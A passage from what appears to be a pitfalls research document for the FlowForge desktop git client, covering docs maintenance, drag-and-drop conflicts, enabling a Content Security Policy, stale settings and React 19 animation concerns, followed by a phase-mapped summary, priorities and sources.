### P19: Documentation Site Maintenance Burden

**What goes wrong:** Adding a documentation site (e.g., Docusaurus, VitePress) creates ongoing maintenance obligations: keeping docs in sync with features, updating screenshots, managing versions. For a small team, the docs become stale within weeks of initial creation.

**Prevention:**
1. **Generate docs from code.** Use TypeDoc or similar for API documentation. Use screenshot automation (Playwright) for visual docs.
2. **Start minimal.** A single-page README with GIFs is more maintainable than a multi-page documentation site.
3. **Co-locate docs with features.** Keep feature documentation in the same PR that implements the feature. Review docs changes alongside code changes.
4. **Defer until v2.** Unless the project has external users, a docs site is premature for v1.x.

**Phase:** Deprioritize until the feature set stabilizes.

**Confidence:** HIGH -- this is a universal project management pattern.

---

### P20: Drag-and-Drop Between Columns Breaks Blade Stack Assumptions

**What goes wrong:** If a future feature allows dragging files between the sidebar (branch list, staging area) and the blade area (to stage files, to open diffs), the drag-and-drop interaction conflicts with the resizable panel layout. The `react-resizable-panels` `Separator` component captures pointer events for resize, which intercepts drag events intended for DnD.

**Prevention:**
1. **Use a drag overlay** (e.g., `@dnd-kit/core` with a DragOverlay) that renders above the panel layout, bypassing the resize handle's event capture.
2. **Disable resize during drag.** Detect drag start and temporarily disable the panel resize handle.
3. **Test specifically on the resize handle boundary.** The 4px-wide resize handle is where drag events are most likely to be intercepted.

**Phase:** Only relevant if drag-and-drop features are planned. Not needed for blade expansion alone.

**Confidence:** MEDIUM -- based on general react-resizable-panels behavior, not tested in FlowForge.

---

### P21: CSP Null Creates Defense-in-Depth Gap

**What goes wrong:** FlowForge's `tauri.conf.json` has `"csp": null`, disabling Content Security Policy entirely. While this is not a vulnerability by itself (no current XSS vectors exist), it means there is zero defense-in-depth. Any future XSS vulnerability (from markdown rendering, third-party library, or supply chain attack) gets unrestricted access.

**Prevention:**
1. **Enable CSP now**, before adding markdown rendering:
   ```json
   "csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' asset: data:; connect-src ipc: http://ipc.localhost"
   ```
2. **Test CSP with Monaco editor.** Monaco may require `'unsafe-eval'` for its web workers. If so, use `worker-src 'self' blob:` instead of adding `'unsafe-eval'` to `script-src`.
3. **Add CSP reporting.** Log violations to the console during development to catch issues early.

**Phase:** Address immediately, before any new blade features are built. This is a hardening step that prevents future pitfalls from becoming exploits.

**Confidence:** HIGH -- verified `"csp": null` in `tauri.conf.json`.

---

### P22: Settings Blade Stale After External Config Change

**What goes wrong:** If settings are stored via `@tauri-apps/plugin-store` and the user modifies the config file externally (or another instance of the app changes it), the settings blade shows stale data. The current `initSettings()` only runs on mount.

**Prevention:**
1. **Watch the config file** for external changes using `plugin-store`'s built-in change detection (if available) or file system watching.
2. **Re-read settings when the blade becomes active.** Use the blade lifecycle to trigger a settings refresh.
3. **Show "externally modified" indicator** if the stored settings diverge from the in-memory state.

**Phase:** Address during settings blade implementation (low priority).

**Confidence:** MEDIUM -- depends on whether external config editing is a realistic use case.

---

### P23: React 19 Concurrent Features Interfere with Blade Animations

**What goes wrong:** React 19 (which FlowForge uses -- `^19.2.4`) includes concurrent rendering features that can cause unexpected behavior with framer-motion animations. React may interrupt or replay renders during transitions, causing animation states to be inconsistent.

**Prevention:**
1. **Pin framer-motion to a React 19-compatible version.** FlowForge uses `^12.31.0` which should be compatible, but verify.
2. **Avoid `useTransition` for blade state changes.** Blade push/pop operations should be synchronous (`set()` in Zustand) to avoid React deferring the state update.
3. **Test animation behavior in production builds.** React's development mode suppresses some concurrent rendering behaviors that appear in production.

**Phase:** Monitor throughout development, but not a blocker.

**Confidence:** LOW -- theoretical concern, framer-motion v12+ likely handles React 19 correctly.

---

## Phase-Mapped Summary

| Phase | Critical Pitfalls | Action Required |
|-------|-------------------|-----------------|
| Blade System Enhancement | P1 (state corruption), P5 (focus), P12 (animation), P13 (Escape conflicts), P14 (process switch) | Must address BEFORE migrating dialogs to blades |
| 3D Viewer | P2 (WebGL context loss), P8 (memory leaks), P10 (bundle size), P18 (file format) | Evaluate bundle size (P10) first as go/no-go gate |
| Markdown Preview | P3 (XSS), P11 (GFM compat), P15 (relative paths) | P3 is critical security; address P21 (CSP) concurrently |
| File Browser | P4 (large repo perf), P16 (Monaco accumulation) | Use virtualization from day one |
| Branch Management | P6 (wrong deletion), P17 (upstream sync) | Cross-reference worktrees; never auto-delete |
| Settings Blade | P7 (unsaved changes), P22 (stale config) | Keep auto-save pattern; do not switch to batch-save |
| Security Hardening | P3 (XSS), P21 (CSP null) | Enable CSP immediately, before any markdown rendering |
| Layout / Responsiveness | P9 (narrow windows), P20 (DnD conflicts) | Test at 800px minimum width |
| Documentation | P19 (maintenance burden) | Defer until feature set stabilizes |
| General | P23 (React 19 concurrent) | Monitor, not a blocker |

---

## Priority Order for Prevention

1. **P21 (CSP)** -- Zero-effort hardening, do it first
2. **P1 (blade state)** -- Architectural, blocks all other blade work
3. **P5 (focus management)** -- Accessibility requirement
4. **P14 (process switch)** -- Per-process blade stacks
5. **P3 (XSS)** -- Security gate for markdown rendering
6. **P10 (bundle size)** -- Go/no-go gate for 3D viewer technology choice
7. **P6 (branch deletion safety)** -- Data loss prevention
8. **P4 (file tree perf)** -- UX quality for large repos
9. Everything else

---

## Quality Gate Verification

- [x] Pitfalls are specific to adding these features to FlowForge (not generic)
- [x] Integration pitfalls with existing blade system, Zustand stores, and framer-motion covered
- [x] Prevention strategies are actionable with code-level specificity
- [x] Phase mapping connects pitfalls to implementation order
- [x] Warning signs / detection methods provided for each pitfall

---

## Sources

### Verified (HIGH confidence)
- [FlowForge `blades.ts`](/Users/phmatray/Repositories/github-phm/FlowForge/src/stores/blades.ts) -- blade stack implementation
- [FlowForge `BladeContainer.tsx`](/Users/phmatray/Repositories/github-phm/FlowForge/src/components/blades/BladeContainer.tsx) -- animation and rendering
- [FlowForge `settings.ts`](/Users/phmatray/Repositories/github-phm/FlowForge/src/stores/settings.ts) -- settings store pattern
- [FlowForge `branches.ts`](/Users/phmatray/Repositories/github-phm/FlowForge/src/stores/branches.ts) -- branch deletion
- [FlowForge `tauri.conf.json`](/Users/phmatray/Repositories/github-phm/FlowForge/src-tauri/tauri.conf.json) -- CSP null, asset protocol scope
- [FlowForge `useKeyboardShortcuts.ts`](/Users/phmatray/Repositories/github-phm/FlowForge/src/hooks/useKeyboardShortcuts.ts) -- Escape handling

### Verified via External Sources (MEDIUM confidence)
- [Tauri WebGL Context Lost Issue #6559](https://github.com/tauri-apps/tauri/issues/6559) -- Linux WebKitGTK 2.40+ bug, upstream
- [Tauri WebGL Lag Issue #8020](https://github.com/tauri-apps/tauri/issues/8020) -- Windows WebView2 performance
- [BabylonJS MSAA Leak](https://forum.babylonjs.com/t/babylon-leaks-msaa-renderbuffers-on-resize-dispose-with-webgl/51228) -- renderbuffer disposal bug
- [BabylonJS Event Listener Leak #12084](https://github.com/BabylonJS/Babylon.js/issues/12084) -- camera event listeners not removed
- [BabylonJS Bundle Size Discussion](https://forum.babylonjs.com/t/es6-modules-and-tree-shaking-bundle-size/22734) -- 1.9MB with tree-shaking
- [CVE-2025-24981](https://thesecmaster.com/blog/how-to-fix-cve-2025-24981-mitigating-xss-vulnerability-in-markdown-library-for-we) -- Markdown XSS via HTML entity bypass
- [Marked XSS Vulnerability](https://snyk.io/blog/marked-xss-vulnerability/) -- marked does not sanitize by default
- [Secure Markdown Rendering in React](https://www.hackerone.com/blog/secure-markdown-rendering-react-balancing-flexibility-and-safety) -- react-markdown safe by default
- [DOMPurify](https://github.com/cure53/DOMPurify) -- sanitization library
- [Focus Management in React](https://www.freecodecamp.org/news/designing-keyboard-accessibility-for-complex-react-experiences/) -- keyboard accessibility patterns
